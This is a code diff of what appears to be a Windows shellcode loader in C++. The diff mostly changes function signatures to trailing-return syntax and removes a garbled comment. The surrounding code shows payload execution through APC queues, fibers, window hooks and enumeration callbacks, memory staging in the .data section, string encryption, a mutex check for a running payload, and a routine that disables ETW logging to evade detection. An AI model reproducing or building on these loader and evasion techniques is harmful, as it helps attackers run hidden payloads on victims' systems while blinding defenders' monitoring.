@@ -20,7 +20,7 @@
 static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
 
-void AlertApc(LPVOID shellcode, SIZE_T shellcodeSize) {
+auto AlertApc(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
 	DWORD dwOldProtection = NULL;
 	LPVOID lpMem = shellcode;
 	SIZE_T size = shellcodeSize;
@@ -30,7 +30,7 @@ void AlertApc(LPVOID shellcode, SIZE_T shellcodeSize) {
 	SleepEx(INFINITE, 1);
 }
 
-void fiberExec(LPVOID shellcode, SIZE_T shellcodeSize) {
+auto fiberExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
 	DWORD dwOldProtection;
 	LPVOID lpMem = shellcode;
 	SIZE_T size = shellcodeSize;
@@ -41,7 +41,7 @@ void fiberExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 	SwitchToFiber(lpFiber);
 }
 
-void WindowshookExec(LPVOID shellcode, SIZE_T shellcodeSize) {
+auto WindowshookExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
 	DWORD dwOldProtection;
 	LPVOID lpMem = shellcode;
 	SIZE_T size = shellcodeSize;
@@ -57,7 +57,7 @@ void WindowshookExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 	UnhookWindowsHookEx(hhk);
 }
 
-void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
+auto EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) -> void {
 	DWORD dwOldProtection;
 	LPVOID lpMem = shellcode;
 	SIZE_T size = shellcodeSize;
@@ -332,7 +332,7 @@ void EnumExec(LPVOID shellcode, SIZE_T shellcodeSize) {
 //
 //}
 
-BOOLEAN ExecuteShellcode(PExecuteShellcodeStruct execStruct) {
+auto ExecuteShellcode(PExecuteShellcodeStruct execStruct) -> BOOLEAN {
 	switch (ExecMethod) {
 	case AlertAPC: {
 		AlertApc(execStruct->lpMem, execStruct->memSize);
@@ -355,7 +355,7 @@ BOOLEAN ExecuteShellcode(PExecuteShellcodeStruct execStruct) {
 	return TRUE;
 }
 
-NTSTATUS AllocateMem(LPVOID* lpMem, PSIZE_T size) {
+auto AllocateMem(LPVOID* lpMem, PSIZE_T size) -> NTSTATUS {
 	NTSTATUS status = 0xC0000001;
 
 	switch (allocateMethod) {
@@ -390,7 +390,6 @@ NTSTATUS AllocateMem(LPVOID* lpMem, PSIZE_T size) {
 		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
 		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
 
-		// ≤È’“.data∂Œ
 		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
 			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
 				DWORD oldProtect;
@@ -411,7 +410,7 @@ NTSTATUS AllocateMem(LPVOID* lpMem, PSIZE_T size) {
 	return status;
 }
 
-BOOLEAN isPayloadRunning() {
+auto isPayloadRunning() -> BOOLEAN {
 	
 	HANDLE hMutex = NULL;
 	OBJECT_ATTRIBUTES objAttr = {0};
@@ -434,7 +433,7 @@ BOOLEAN isPayloadRunning() {
 	return FALSE;
 }
 
-BOOLEAN disableETW() {
+auto disableETW() -> BOOLEAN {
 	DWORD oldProtect = 0;
 	char * etwWriteStr = _strdup(ENCRYPT_STR("EtwEventWrite"));
 	SIZE_T size = 0x1000;
